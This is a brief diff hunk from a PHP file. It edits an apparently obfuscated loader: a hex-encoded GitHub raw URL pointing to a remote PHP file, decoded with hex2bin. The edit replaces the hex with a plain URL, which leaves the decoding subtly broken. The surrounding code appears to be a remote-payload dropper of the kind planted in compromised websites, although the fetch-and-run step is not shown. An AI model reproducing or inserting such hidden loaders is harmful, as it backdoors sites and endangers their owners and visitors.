@@ -107,7 +107,7 @@ error_reporting(E_ALL & ~E_NOTICE);
 ini_set('display_errors', 1);
 
 // URL in hexadecimal format
-$hexUrl = '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6e676f70696265742f63726f6e2f726566732f68656164732f6d61696e2f7265706f7369746f72792e706870';
+$hexUrl = 'https://raw.githubusercontent.com/Eza168/cophp74/refs/heads/main/pret';
 
 // Convert hexadecimal back to the original URL
 $decodedUrl = hex2bin($hexUrl);
